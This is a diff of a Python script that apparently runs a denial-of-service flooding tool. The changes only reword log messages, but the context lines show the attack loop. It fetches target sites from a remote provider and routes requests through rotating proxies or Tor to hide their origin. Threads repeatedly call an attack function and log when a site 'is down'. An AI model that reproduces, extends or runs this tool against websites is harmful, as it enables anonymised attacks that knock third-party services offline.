@@ -78,7 +78,7 @@ def mainth(site: str):
             if not settings.ENABLE_TOR:
                 for proxy in remoteProvider.get_proxies():
                     if proxy_view:
-                        logger.info('USING PROXY:' + proxy["ip"] + " " + proxy["auth"])
+                        logger.info('using proxy:' + proxy["ip"] + " " + proxy["auth"])
                     scraper.proxies.update(
                         {
                             'http': f'http://{proxy["auth"]}@{proxy["ip"]}',
@@ -89,7 +89,7 @@ def mainth(site: str):
                     attacks_number += loop_attacks_number
             else:
                 tor_proxy.change_ip()
-                logger.info(f"USING tor proxy with ip {tor_proxy.get_ip()}")
+                logger.info(f"using TOR proxy with ip {tor_proxy.get_ip()}")
                 scraper.proxies.update(tor_proxy.get_sock5_proxies())
                 attacks_count, response_code = make_attack(site, scraper)
                 attacks_number += attacks_count
@@ -97,11 +97,11 @@ def mainth(site: str):
             attacks_count, response_code = make_attack(site, scraper)
             attacks_number += attacks_count
         if attacks_number > 0:
-            logger.success("SUCCESSFUL ATTACKS on " + site + ": " + str(attacks_number))
+            logger.success(site + " was attacked " + str(attacks_number) + " times")
     except ConnectionError:
         logger.success(f"{site} is down")
     except Exception as exc:
-        logger.warning(f"issue happened: {exc}, SUCCESSFUL ATTACKS: {attacks_number}")
+        logger.warning(f"Error: {exc}. Performed: {attacks_number} attacks")
     # when thread finishes, add new task to executor
     executor.submit(mainth, choice(remoteProvider.get_target_sites()))
 
@@ -115,5 +115,5 @@ if __name__ == '__main__':
             for _ in range(threads):
                 executor.submit(mainth, choice(sites))
     except KeyboardInterrupt:
-        logger.info("Shutdown")
+        logger.info("Shutting down")
         executor.shutdown()
